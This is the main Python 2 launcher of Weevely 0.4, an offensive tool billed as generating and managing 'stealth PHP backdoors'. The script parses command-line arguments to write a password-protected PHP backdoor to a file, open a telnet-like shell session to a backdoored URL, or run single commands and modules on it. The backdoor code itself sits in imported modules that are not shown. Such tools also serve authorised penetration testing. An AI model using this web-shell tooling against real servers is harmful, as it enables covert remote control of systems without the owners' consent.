#!/usr/bin/env python
# This file is part of Weevely NG.
#
# Copyright(c) 2011-2012 Weevely Developers
# http://code.google.com/p/weevely/
#
# This file may be licensed under the terms of of the
# GNU General Public License Version 2 (the ``GPL'').
#
# Software distributed under the License is distributed
# on an ``AS IS'' basis, WITHOUT WARRANTY OF ANY KIND, either
# express or implied. See the GPL for the specific language
# governing rights and limitations.
#
# You should have received a copy of the GPL along with this
# program. If not, go to http://www.gnu.org/licenses/gpl.html
# or write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.


from core.terminal import Terminal
from core.backdoor import Backdoor
from core.modules_handler import ModHandler
from core.modules_info import ModInfos
from core.test import Test

import sys
    
print '''
Weevely 0.4 - Generate and manage stealth PHP backdoors
              Emilio Pinna, Simone Margaritelli 2011-2012            
'''
   
help_string = '''Start telnet-like session
  weevely <url> <password> 
  
Run single command or module
  weevely <url> <password> <command> 
  weevely <url> <password> :<module name> <argument1> <arg2> ..

Generate PHP backdoor script
  weevely generate <password> <output path> 

Show help with command :help and run modules with :<module name>. Available modules:'''  
    
if __name__ == "__main__":

    
    if  len(sys.argv) == 3 and sys.argv[1].startswith('http'):
        
        print "[+] Starting terminal. Shell probe may take a while..."
        
        url = sys.argv[1]
        password = sys.argv[2]
          
        try:
            Terminal ( ModHandler( url, password ) ).loop()
        except KeyboardInterrupt:
            print '\n[!] Exiting. Bye ^^'
        
    elif len(sys.argv) == 4 and sys.argv[1] == 'generate':
        try:
         Backdoor( sys.argv[2] ).save( sys.argv[3] )
        except Exception, e:
            print '\n[!] Creation error: %s.' % str(e)
            
            
    elif len(sys.argv) == 4 and sys.argv[1] == 'test':
        try:
         Test().run( sys.argv[2], sys.argv[3] )
        except Exception, e:
            print '\n[!] Test error: %s.' % str(e)
            raise
        
    elif len(sys.argv) > 3 and sys.argv[1].startswith('http'):

        if sys.argv[3] == ':help':
            print help_string
            ModInfos().print_module_infos()
            
        else:
            
            url = sys.argv[1]
            password = sys.argv[2]        
            
            try:
                
                terminal = Terminal (ModHandler(url, password), True)
                if sys.argv[3][0] == terminal.module_char:
                    terminal.run_module_cmd(sys.argv[3:])
                else:
                    terminal.run_line_cmd(' '.join(sys.argv[3:]))
                
                
            except KeyboardInterrupt:
                print '\n[!] Exiting. Bye ^^'
    else:
        
        print help_string
        ModInfos().print_module_summary()
            
        print ''
    
